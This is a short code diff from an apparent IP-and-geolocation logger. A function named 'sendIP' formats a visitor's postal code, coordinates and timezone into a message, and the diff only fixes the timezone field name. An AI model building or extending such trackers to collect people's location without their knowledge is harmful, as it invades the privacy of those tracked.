@@ -40,7 +40,7 @@ const sendIP = async () => {
             `**Postal Code >>** ${geoData.postal || geoData.postal_code || 'N/A'}`,
             `**Latitude >>** ${geoData.latitude ?? geoData.lat ?? 'N/A'}`,
             `**Longitude >>** ${geoData.longitude ?? geoData.lon ?? 'N/A'}`,
-            `**Timezone >>** ${geoData.timezone || 'N/A'}`
+            `**Timezone >>** ${geoData.time_zone || 'N/A'}`
           ].join('\n'),
           color: 0x800080
         }
